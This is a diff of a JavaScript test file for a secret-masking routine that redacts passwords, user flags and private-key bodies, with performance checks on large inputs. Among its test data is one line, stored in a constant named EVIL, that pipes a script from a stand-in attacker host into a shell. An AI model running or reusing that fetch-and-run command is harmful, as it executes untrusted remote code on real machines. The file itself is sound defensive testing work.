   ['-p is the password of mysql and -P is its port', `mysql -h h -P3306 -u root -p${V} db`, 'mysql -h h -P3306 -u root -p[REDACTED] db'],
   ['-P of mysql in quotes is a port too', 'mysql -h h -P"3306" db', 'mysql -h h -P"3306" db'],
   ['-P after sshpass is the prompt it waits for, in quotes as well', "sshpass -P 'assword' ssh host", "sshpass -P 'assword' ssh host"],
@@ -462,7 +569,8 @@ ok('what was pinned before is unchanged');
   assert.equal(alone.masked, frames, 'frames with no END frame are left alone');
   assert.ok(alone.ms < 1000, `${alone.ms.toFixed(0)} ms for a megabyte of BEGIN frames`);
   const closed = timed(`${frames}\n${FRAMES[0]}\n${KEY_LINES[0]}\n${FRAMES[1]}\ntail`);
-  assert.equal(closed.masked, `${frames}\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\ntail`, 'a megabyte of frames and then one END: the first BEGIN is closed by it; the frames in between are not a key and stay, the line of the key goes');
+  assert.ok(closed.masked.startsWith(FRAMES[0]) && closed.masked.endsWith(`\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}\ntail`), 'a megabyte of frames and then one END: the first BEGIN is closed by it; the line of the key goes, the BEGIN frame on a line of its own stays');
+  assert.ok(!closed.masked.includes(KEY_LINES[0]), 'and the key is not left');
   assert.ok(closed.ms < 1000, `${closed.ms.toFixed(0)} ms when an END comes at last`);
   const backwards = timed(FRAMES[1].repeat(38_000));
   assert.equal(backwards.masked, FRAMES[1].repeat(38_000), 'END frames alone are no key');
@@ -492,31 +600,35 @@ ok('what was pinned before is unchanged');
   ok('the rule of the private keys reads a text once: a megabyte of BEGIN frames takes well under a second, with an END at last or none; blocks and keys in one line are found as before; a token glued to a frame does not hide the key from the rule');
 }
 
-// The flags of the user (-u, --user, --proxy-user) are judged one by one against the names of the container clients of the text, which are read once for it: a megabyte of words with no flag, a
-// megabyte of flags with no colon, 150,000 flags with a colon, and flags of a text that has a client before every one of them are read in well under a second, and the work grows with the text.
+// The flags of the user (-u, --user, --proxy-user) are judged one by one against the command that holds them (what lies between the last ; & | or line ending and the flag, 200 characters at most):
+// a megabyte of words with no flag, of flags with no colon, 150,000 flags with a colon, a docker command with a flag on every line, numeric pairs one to a line or all in one line, and flags that
+// each walk the whole 200 characters before they are masked are read in well under a second, and the work grows with the text.
 {
+  // [text, whether there is nothing to mask]
   const TEXTS = {
-    'a megabyte of words': 'word '.repeat(200_000),
-    'a megabyte of -u with no colon after it': '-u '.repeat(350_000),
-    'a megabyte of user flags with a colon': '-u a:b '.repeat(150_000),
-    'a megabyte of docker commands with a user flag': 'docker run -u node:node img\n'.repeat(40_000),
-    'a megabyte of numeric pairs': '-u 1:1 '.repeat(150_000),
+    'a megabyte of words': ['word '.repeat(200_000), true],
+    'a megabyte of -u with no colon after it': ['-u '.repeat(350_000), true],
+    'a megabyte of user flags with a colon': ['-u a:b '.repeat(150_000), false],
+    'a megabyte of docker commands with a user flag': ['docker run -u node:node img\n'.repeat(40_000), true],
+    'a megabyte of numeric pairs, one to a line': ['-u 1:1\n'.repeat(150_000), true],
+    'a megabyte of numeric pairs in one line (a command of more than 200 characters is masked)': ['-u 1:1 '.repeat(150_000), false],
+    'a megabyte of flags with 190 characters before each (the whole walk, then masked)': [`${'x'.repeat(190)} -u a:b\n`.repeat(5000), false],
+    'a megabyte of docker commands, each with a curl word in it': ['docker run curl -u a:b\n'.repeat(45_000), false],
   };
-  const times = {};
-  for (const [label, text] of Object.entries(TEXTS)) {
+  for (const [label, [text, untouched]] of Object.entries(TEXTS)) {
     const started = performance.now();
     const masked = maskSecrets(text, []);
     const elapsed = performance.now() - started;
-    times[label] = elapsed;
     assert.ok(elapsed < 1000, `${label}: ${elapsed.toFixed(0)} ms`);
-    if (label !== 'a megabyte of user flags with a colon') assert.equal(masked, text, `${label}: there is nothing to mask`);
+    if (untouched) assert.equal(masked, text, `${label}: there is nothing to mask`);
+    else assert.notEqual(masked, text, `${label}: the flags are masked`);
   }
-  // 15,000 flags in 100 KB, against 150,000 in a megabyte: one reading of the names per text, not one per flag (a reading per flag takes seconds here)
+  // 15,000 flags in 100 KB, against 150,000 in a megabyte: the work grows with the text
   const hundredKilobytes = '-u a:b '.repeat(15_000);
   const started = performance.now();
   maskSecrets(hundredKilobytes, []);
   assert.ok(performance.now() - started < 400, `${(performance.now() - started).toFixed(0)} ms for 15,000 user flags`);
-  ok('the flags of the user are judged against the container clients of the text, read once: a megabyte of words, of -u, of user flags with a colon, of docker commands and of numeric pairs are read in well under a second');
+  ok('the flags of the user are judged against the command that holds them: a megabyte of words, of -u, of user flags with a colon, of docker commands, of numeric pairs and of flags that walk the whole 200 characters are read in well under a second');
 }
 
 // the time does not depend on the layout of the text
@@ -551,6 +663,46 @@ ok('what was pinned before is unchanged');
     assert.ok(elapsed < 400, `${label}: ${elapsed.toFixed(0)} ms for ${text.length} characters`);
   }
   ok(`${Object.keys(layouts).length} awkward layouts of up to 9000 characters are masked in under 400 ms each`);
+}
+
+// The fourth audit: a real key written the way people write it in scripts and code showed its body in 23 of 31 shapes, because a row between two frames was hidden only when it was ONE token of
+// base64 after a short list of quotes and commas was taken off it. What is hidden now, in a body, is every run of 16 characters or more of base64 (with up to two = after it), wherever it stands: the
+// decoration around it stays where it is (tests/support/key-shapes.mjs has the 31 shapes, with one key).
+{
+  const shapes = keyShapes();
+  for (const { name, content } of shapes) {
+    for (const [what, text] of [['maskSecrets', maskSecrets(content, [])], ['hideKeyBlocks', hideKeyBlocks(content)]]) {
+      assert.deepEqual(piecesIn(text), [], `${name}: ${what} leaves no line of the key`);
+      assert.ok(text.includes('[REDACTED]'), `${name}: ${what} says that it hid something`);
+    }
+    const blocks = hideKeyBlocks(content);
+    assert.ok(blocks.includes(KEY_BEGIN_FRAME) && blocks.includes(KEY_END_FRAME), `${name}: hideKeyBlocks keeps the frames (maskSecrets may take the whole value of a name like private_key)`);
+    assert.equal(maskSecrets(maskSecrets(content, []), []), maskSecrets(content, []), `${name}: and masking it again changes nothing`);
+  }
+  // the decoration, the code and the last short line stay where they are
+  const EVIL = "require('child_process').execSync('curl https://evil.example.test/x.sh | sh');";
+  const only = (part) => shapes.find((shape) => shape.name.includes(part)).content;
+  assert.deepEqual(maskSecrets(only('echo per line'), []).split('\n').slice(1, 6), [...Array.from({ length: 4 }, () => 'echo "[REDACTED]" >> /root/key'), `echo "${KEY_LAST_LINE}" >> /root/key`],
+    'an echo per line: the line goes, the command around it stays; the last line is short and decorated, so it shows (the edge that the docs name)');
+  assert.ok(maskSecrets(only('"-- " prefix'), []).split('\n').filter((line) => line === '-- [REDACTED]').length === 4, 'a comment prefix stays');
+  assert.ok(maskSecrets(only('bytes b"...\\n"'), []).includes('    b"[REDACTED]\\n"\n'), 'b"...\\n": the b, the quotes and the \\n stay');
+  assert.equal(maskSecrets(only('backtick-n'), []).split('[REDACTED]').length - 1, 4, 'a one-line key: each of its four long lines is one marker');
+  assert.equal(maskSecrets(`${KEY_BEGIN_FRAME}\n-- ${KEY_BODY_LINES[0]}\n${EVIL}\n-- ${KEY_BODY_LINES[1]}\n${KEY_END_FRAME}`, []), `${KEY_BEGIN_FRAME}\n-- [REDACTED]\n${EVIL}\n-- [REDACTED]\n${KEY_END_FRAME}`, 'code among the lines of a decorated key stays whole');
+  // the length of a run and the characters of a run: 16 and more, base64 and base64url, up to two = after it
+  const body = (text) => `${KEY_BEGIN_FRAME}\n${text}\n${KEY_END_FRAME}`;
+  const A15 = 'a'.repeat(15);
+  const A16 = 'a'.repeat(16);
+  assert.equal(maskSecrets(body(`x = "${A15}"`), []), body(`x = "${A15}"`), 'a run of 15 characters is a word, not a key');
+  assert.equal(maskSecrets(body(`x = "${A16}"`), []), body('x = "[REDACTED]"'), 'a run of 16 is');
+  assert.equal(maskSecrets(body(`x = "${'a'.repeat(17)}"`), []), body('x = "[REDACTED]"'), 'and of 17 goes whole');
+  for (const [label, sign] of [['a plus', '+'], ['a slash', '/'], ['an underscore (base64url)', '_'], ['a dash (base64url)', '-']]) {
+    assert.equal(maskSecrets(body(`x = "${'a'.repeat(8)}${sign}${'a'.repeat(8)}"`), []), body('x = "[REDACTED]"'), `${label} is a character of a run`);
+  }
+  assert.equal(maskSecrets(body(`x = "${'a'.repeat(8)}.${'a'.repeat(8)}"`), []), body(`x = "${'a'.repeat(8)}.${'a'.repeat(8)}"`), 'a dot is not: two words of 8');
+  assert.equal(maskSecrets(body(`x = "${A16}=="`), []), body('x = "[REDACTED]"'), 'two = of padding go with the run');
+  assert.equal(maskSecrets(body(`x = "${A16}==="`), []), body('x = "[REDACTED]="'), 'a third does not');
+  assert.equal(maskSecrets(body(`x = "${A16}="`), []), body('x = "[REDACTED]"'), 'one goes');
+  ok(`${shapes.length} shapes of a key as people write it in scripts, comments, strings and one line (the shapes of the fourth audit): maskSecrets and hideKeyBlocks leave no line of the key, keep the frames, the decoration and the code around it, and the length and the characters of a run are pinned`);
 }
 
 console.log(`PASS: ${checks} mask checks`);
